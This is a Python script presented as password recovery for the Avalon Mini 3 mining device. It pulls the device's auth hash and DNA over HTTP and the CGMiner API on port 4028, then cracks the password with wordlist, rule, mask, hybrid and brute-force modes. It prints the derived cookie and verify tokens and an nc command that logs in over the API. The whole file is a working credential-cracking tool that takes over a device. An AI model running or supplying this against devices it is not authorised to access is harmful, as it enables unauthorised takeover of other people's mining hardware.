#!/usr/bin/env python3
"""
Avalon Mini 3 Password Recovery

Recovers passwords using: auth = SHA256(SHA256(password)[:8] + DNA)[:8]

Attack modes: --wordlist, --mask, --bruteforce, --hybrid
Mask chars: ?l=lower ?u=upper ?d=digit ?s=special ?a=all ?w=alnum

Performance: ~17M hashes/sec on M4 (6 chars alnum ~1hr, 8+ use GPU)
"""

import argparse
import hashlib
import json
import multiprocessing
import os
import re
import socket
import sys
import time
import urllib.request
from concurrent.futures import ProcessPoolExecutor, as_completed
from itertools import product
from typing import Generator, Optional

# ============================================================================
# CHARACTER SETS
# ============================================================================

CHARSET_LOWER = 'abcdefghijklmnopqrstuvwxyz'
CHARSET_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
CHARSET_DIGITS = '0123456789'
CHARSET_SPECIAL = '!@#$%^&*()-_=+[]{}|;:,.<>?'
CHARSET_SPECIAL_COMMON = '!@#$%&*_-+'
CHARSET_ALNUM = CHARSET_LOWER + CHARSET_UPPER + CHARSET_DIGITS
CHARSET_ALL = CHARSET_ALNUM + CHARSET_SPECIAL

# Mask characters
MASK_CHARS = {
    '?l': CHARSET_LOWER,      # lowercase
    '?u': CHARSET_UPPER,      # uppercase
    '?d': CHARSET_DIGITS,     # digits
    '?s': CHARSET_SPECIAL,    # special
    '?a': CHARSET_ALL,        # all printable
    '?w': CHARSET_ALNUM,      # alphanumeric (word chars)
}

# Common suffixes for rule mutations
COMMON_SUFFIXES = [
    '', '!', '1', '12', '123', '1234', '12345',
    '@', '#', '$', '!@#', '!!',
    '01', '99', '00', '007', '69', '666', '777',
    '2020', '2021', '2022', '2023', '2024', '2025', '2026',
]

# L33t substitutions
LEET_MAP = {
    'a': ['a', '4', '@'],
    'e': ['e', '3'],
    'i': ['i', '1', '!'],
    'o': ['o', '0'],
    's': ['s', '5', '$'],
    't': ['t', '7'],
    'l': ['l', '1'],
}


# ============================================================================
# CORE HASH FUNCTIONS
# ============================================================================

def compute_auth(password: str, dna: str) -> str:
    """Compute auth value for a given password and DNA."""
    webpass = hashlib.sha256(password.encode()).hexdigest()
    auth_input = webpass[:8] + dna
    return hashlib.sha256(auth_input.encode()).hexdigest()[:8]


def compute_auth_fast(password: str, dna_bytes: bytes) -> str:
    """Optimized auth computation with pre-encoded DNA."""
    webpass = hashlib.sha256(password.encode()).hexdigest()[:8]
    auth_input = webpass.encode() + dna_bytes
    return hashlib.sha256(auth_input).hexdigest()[:8]


def check_password_batch(args: tuple[list, str, bytes]) -> Optional[str]:
    """Check a batch of passwords. Returns password if found, None otherwise."""
    passwords, target, dna_bytes = args
    for password in passwords:
        if compute_auth_fast(password, dna_bytes) == target:
            return password
    return None


# ============================================================================
# RULE-BASED MUTATIONS
# ============================================================================

def apply_rules(word: str) -> Generator[str, None, None]:
    """Apply mutation rules to a word."""
    seen = set()

    def emit(w):
        if w not in seen and len(w) <= 16:
            seen.add(w)
            return w
        return None

    # Original
    if p := emit(word):
        yield p

    # Case variations
    for w in [word.lower(), word.upper(), word.capitalize(), word.swapcase()]:
        if p := emit(w):
            yield p

    # L33t variations
    leet = word.lower()
    for char, subs in LEET_MAP.items():
        if char in leet and len(subs) > 1:
            if p := emit(leet.replace(char, subs[1])):
                yield p

    # Full l33t
    full_leet = word.lower()
    for char, subs in LEET_MAP.items():
        if len(subs) > 1:
            full_leet = full_leet.replace(char, subs[1])
    if p := emit(full_leet):
        yield p

    # Suffixes on common bases
    for base in [word.lower(), word.capitalize()]:
        for suffix in COMMON_SUFFIXES:
            if p := emit(base + suffix):
                yield p


# ============================================================================
# PATTERN GENERATORS
# ============================================================================

def generate_mask_candidates(mask: str) -> Generator[str, None, None]:
    """Generate candidates from mask pattern.

    Mask characters:
        ?l = lowercase (a-z)
        ?u = uppercase (A-Z)
        ?d = digit (0-9)
        ?s = special (!@#$...)
        ?a = all printable
        ?w = alphanumeric
        literal = literal character
    """
    charsets = []
    i = 0
    while i < len(mask):
        if mask[i] == '?' and i + 1 < len(mask):
            key = mask[i:i+2]
            if key in MASK_CHARS:
                charsets.append(MASK_CHARS[key])
                i += 2
                continue
        charsets.append(mask[i])
        i += 1

    for combo in product(*charsets):
        yield ''.join(combo)


def generate_hybrid(words: list[str], suffix_len: int) -> Generator[str, None, None]:
    """Hybrid attack: wordlist + brute force suffix."""
    suffix_chars = CHARSET_DIGITS + CHARSET_SPECIAL_COMMON

    for word in words:
        yield word
        for length in range(1, suffix_len + 1):
            for suffix in product(suffix_chars, repeat=length):
                candidate = word + ''.join(suffix)
                if len(candidate) <= 16:
                    yield candidate


def generate_bruteforce(charset: str, max_len: int, min_len: int = 1) -> Generator[str, None, None]:
    """Generate all combinations from min_len to max_len."""
    for length in range(min_len, max_len + 1):
        for combo in product(charset, repeat=length):
            yield ''.join(combo)


def count_combinations(charset: str, max_len: int, min_len: int = 1) -> int:
    """Count total combinations for progress reporting."""
    total = 0
    for length in range(min_len, max_len + 1):
        total += len(charset) ** length
    return total


def count_mask_combinations(mask: str) -> int:
    """Count combinations for a mask pattern."""
    total = 1
    i = 0
    while i < len(mask):
        if mask[i] == '?' and i + 1 < len(mask):
            key = mask[i:i+2]
            if key in MASK_CHARS:
                total *= len(MASK_CHARS[key])
                i += 2
                continue
        i += 1
    return total


# ============================================================================
# DEVICE COMMUNICATION
# ============================================================================

def fetch_device_info(ip: str) -> tuple[str, str]:
    """Fetch auth target and DNA from device."""
    try:
        auth_url = f'http://{ip}/get_auth.cgi'
        response = urllib.request.urlopen(auth_url, timeout=5)
        auth_resp = response.read().decode()
        auth_match = re.search(r'"auth":"([^"]+)"', auth_resp)
        if not auth_match:
            raise ValueError("Could not parse auth from get_auth.cgi")
        auth = auth_match.group(1)
    except Exception as e:
        raise ValueError(f"Failed to fetch auth from {ip}: {e}") from e

    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((ip, 4028))
        sock.send(json.dumps({'command': 'stats'}).encode())

        data = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        sock.close()

        stats_resp = data.decode().rstrip('\x00')
        dna_match = re.search(r'DNA\[([^\]]+)\]', stats_resp)
        if not dna_match:
            raise ValueError("Could not parse DNA from stats")
        dna = dna_match.group(1)
    except Exception as e:
        raise ValueError(f"Failed to fetch DNA from {ip}:4028: {e}") from e

    return auth, dna


# ============================================================================
# CRACKING ENGINE
# ============================================================================

def format_time_estimate(seconds: float) -> str:
    """Format seconds into human-readable time estimate."""
    if seconds < 60:
        return f"{seconds:.1f} seconds"
    if seconds < 3600:
        return f"{seconds / 60:.1f} minutes"
    if seconds < 86400:
        return f"{seconds / 3600:.1f} hours"
    return f"{seconds / 86400:.1f} days"


def crack_generator(
    target: str,
    dna: str,
    generator: Generator[str, None, None],
    total: int = 0,
    desc: str = "Recovering",
    num_workers: Optional[int] = None,
    batch_size: int = 10000,
) -> Optional[str]:
    """Generic cracking engine using a password generator."""
    if num_workers is None:
        num_workers = multiprocessing.cpu_count()

    dna_bytes = dna.encode()

    print(f"[*] {desc}")
    print(f"[*] Target: {target}")
    print(f"[*] DNA: {dna}")
    print(f"[*] Workers: {num_workers}")
    if total > 0:
        print(f"[*] Keyspace: {total:,}")
        rate_estimate = num_workers * 1_700_000
        eta_secs = total / rate_estimate
        print(f"[*] Estimated time: {format_time_estimate(eta_secs)}")
    print()

    start_time = time.time()
    checked = 0
    found = None

    with ProcessPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        batch = []

        try:
            for password in generator:
                batch.append(password)

                if len(batch) >= batch_size:
                    futures.append(executor.submit(check_password_batch, (batch.copy(), target, dna_bytes)))
                    batch.clear()

                    # Check completed futures
                    done_futures = [f for f in futures if f.done()]
                    for future in done_futures:
                        result = future.result()
                        if result:
                            found = result
                            break
                        futures.remove(future)

                    if found:
                        break

                    # Progress update
                    checked += batch_size
                    elapsed = time.time() - start_time
                    rate = checked / elapsed if elapsed > 0 else 0
                    if total > 0:
                        pct = (checked / total) * 100
                        eta = (total - checked) / rate if rate > 0 else 0
                        print(f"\r[*] {pct:.2f}% | {checked:,}/{total:,} | {rate:,.0f}/s | ETA: {eta:.0f}s", end='')
                    else:
                        print(f"\r[*] Checked: {checked:,} | {rate:,.0f}/s | {elapsed:.1f}s", end='')

            # Submit remaining batch
            if batch and not found:
                futures.append(executor.submit(check_password_batch, (batch.copy(), target, dna_bytes)))

            # Wait for remaining futures
            if not found:
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        found = result
                        break

        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            executor.shutdown(wait=False)
            return None

    elapsed = time.time() - start_time
    print()

    if found:
        print(f"\n[+] PASSWORD FOUND: {found}")
        print(f"[+] Time: {elapsed:.2f}s")
        print(f"[+] Rate: {checked/elapsed:,.0f}/s")
        return found
    else:
        print(f"\n[-] Not found in {checked:,} candidates")
        print(f"[-] Time: {elapsed:.2f}s")
        return None


def crack_wordlist(
    target: str,
    dna: str,
    wordlist_path: str,
    use_rules: bool = False,
    num_workers: Optional[int] = None,
    batch_size: int = 10000,
) -> Optional[str]:
    """Dictionary attack using wordlist file."""

    def word_generator():
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue
                if use_rules:
                    yield from apply_rules(password)
                else:
                    yield password

    print("[*] Counting wordlist...")
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        line_count = sum(1 for _ in f)

    total = line_count * (30 if use_rules else 1)
    desc = f"Dictionary: {wordlist_path}" + (" +rules" if use_rules else "")

    return crack_generator(target, dna, word_generator(), total, desc, num_workers, batch_size)


def crack_mask(
    target: str,
    dna: str,
    mask: str,
    num_workers: Optional[int] = None,
    batch_size: int = 10000,
) -> Optional[str]:
    """Mask attack with pattern."""
    total = count_mask_combinations(mask)
    return crack_generator(
        target, dna, generate_mask_candidates(mask), total, f"Mask: {mask}", num_workers, batch_size
    )


def crack_hybrid(
    target: str,
    dna: str,
    wordlist_path: str,
    suffix_len: int,
    num_workers: Optional[int] = None,
    batch_size: int = 10000,
) -> Optional[str]:
    """Hybrid attack: wordlist + brute force suffix."""
    words = []
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            word = line.strip()
            if word:
                words.append(word)

    suffix_chars = len(CHARSET_DIGITS + CHARSET_SPECIAL_COMMON)
    suffix_combos = sum(suffix_chars**length for length in range(suffix_len + 1))
    total = len(words) * suffix_combos

    return crack_generator(
        target,
        dna,
        generate_hybrid(words, suffix_len),
        total,
        f"Hybrid: {wordlist_path} + {suffix_len}-char suffix",
        num_workers,
        batch_size,
    )


def crack_bruteforce(
    target: str,
    dna: str,
    charset: str,
    max_len: int,
    min_len: int = 1,
    num_workers: Optional[int] = None,
    batch_size: int = 50000,
) -> Optional[str]:
    """Brute force attack."""
    total = count_combinations(charset, max_len, min_len)
    return crack_generator(
        target,
        dna,
        generate_bruteforce(charset, max_len, min_len),
        total,
        f"Brute force: {min_len}-{max_len} chars, {len(charset)} char set",
        num_workers,
        batch_size,
    )


def print_credentials(password: str, dna: str) -> None:
    """Print full credentials for a recovered password."""
    webpass = hashlib.sha256(password.encode()).hexdigest()
    code = hashlib.sha256(dna.encode()).hexdigest()[:24]
    auth = hashlib.sha256((webpass[:8] + dna).encode()).hexdigest()[:8]
    verify = "ff0000ee" + hashlib.sha256((code + webpass[:24]).encode()).hexdigest()[:24]
    cookie = auth + webpass[:24]

    print()
    print("=" * 60)
    print("CREDENTIALS")
    print("=" * 60)
    print(f"Password: {password}")
    print(f"Auth:     {auth}")
    print(f"Code:     {code}")
    print(f"Verify:   {verify}")
    print(f"Cookie:   {cookie}")
    print()
    print("To authenticate via CGMiner API:")
    print(f'  echo \'{{"command":"ascset","parameter":"0,qr_auth,{auth},{verify}"}}\' | nc <IP> 4028')
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description='Avalon Mini 3 Password Recovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -d 192.168.130.132 -w default-passwords.txt
  %(prog)s -d 192.168.130.132 -w rockyou.txt --rules
  %(prog)s -d 192.168.130.132 -w words.txt --hybrid 4
  %(prog)s -d 192.168.130.132 --mask "?d?d?l?l?l?l?d?d?d?d?s?s"
  %(prog)s -d 192.168.130.132 --bruteforce --max-len 6
        """
    )

    # Target
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument('--device', '-d', help='Device IP (fetches auth and DNA automatically)')
    target_group.add_argument('--target', '-t', help='Target auth hash (8 hex chars)')

    parser.add_argument('--dna', help='Device DNA (required with --target)')

    # Attack modes
    attack_group = parser.add_mutually_exclusive_group()
    attack_group.add_argument('--wordlist', '-w', help='Wordlist file for dictionary attack')
    attack_group.add_argument('--mask', '-m', help='Mask pattern (e.g., "?l?l?l?l?d?d?d?d")')
    attack_group.add_argument('--bruteforce', '-b', action='store_true', help='Brute force mode')

    # Wordlist options
    parser.add_argument('--rules', '-r', action='store_true',
                       help='Apply rule mutations (case, l33t, suffixes)')
    parser.add_argument('--hybrid', type=int, metavar='N',
                       help='Hybrid: wordlist + N-char brute force suffix')

    # Brute force options
    parser.add_argument('--min-len', type=int, default=1, help='Min password length (default: 1)')
    parser.add_argument('--max-len', type=int, default=6, help='Max password length (default: 6)')
    parser.add_argument('--charset', choices=['lower', 'upper', 'digits', 'alnum', 'all'],
                        default='alnum', help='Character set (default: alnum)')

    # Performance
    parser.add_argument('--workers', '-j', type=int, help='Worker processes (default: CPU count)')
    parser.add_argument('--batch-size', type=int, default=10000, help='Batch size (default: 10000)')

    args = parser.parse_args()

    if not (args.wordlist or args.mask or args.bruteforce):
        parser.error("Specify attack mode: --wordlist, --mask, or --bruteforce")

    if not (args.device or args.target):
        parser.error("Specify --device or --target")

    if args.target and not args.dna:
        parser.error("--dna required with --target")

    if args.device:
        print(f"[*] Connecting to {args.device}...")
        try:
            target, dna = fetch_device_info(args.device)
            print(f"[+] Auth: {target}")
            print(f"[+] DNA: {dna}")
        except ValueError as e:
            print(f"[-] Error: {e}")
            sys.exit(1)
    else:
        target = args.target.lower()
        dna = args.dna.lower()

    if len(target) != 8 or not all(c in '0123456789abcdef' for c in target):
        print(f"[-] Invalid auth format (expected 8 hex chars): {target}")
        sys.exit(1)

    print()

    result = None
    if args.wordlist:
        if not os.path.exists(args.wordlist):
            print(f"[-] File not found: {args.wordlist}")
            print("[*] Run with --wordlists for download instructions")
            sys.exit(1)

        if args.hybrid:
            result = crack_hybrid(target, dna, args.wordlist, args.hybrid,
                                 args.workers, args.batch_size)
        else:
            result = crack_wordlist(target, dna, args.wordlist, args.rules,
                                   args.workers, args.batch_size)

    elif args.mask:
        result = crack_mask(target, dna, args.mask, args.workers, args.batch_size)

    elif args.bruteforce:
        charset_map = {
            'lower': CHARSET_LOWER,
            'upper': CHARSET_UPPER,
            'digits': CHARSET_DIGITS,
            'alnum': CHARSET_ALNUM,
            'all': CHARSET_ALL,
        }
        result = crack_bruteforce(
            target, dna, charset_map[args.charset], args.max_len, args.min_len, args.workers, args.batch_size
        )

    if result:
        print_credentials(result, dna)
        sys.exit(0)
    else:
        print("\n[*] Password not found. Try:")
        print("    - Different/larger wordlist")
        print("    - Add --rules for mutations")
        print("    - Use --hybrid N to add suffix brute force")
        print("    - If you know the pattern, use --mask")
        sys.exit(1)


if __name__ == '__main__':
    main()
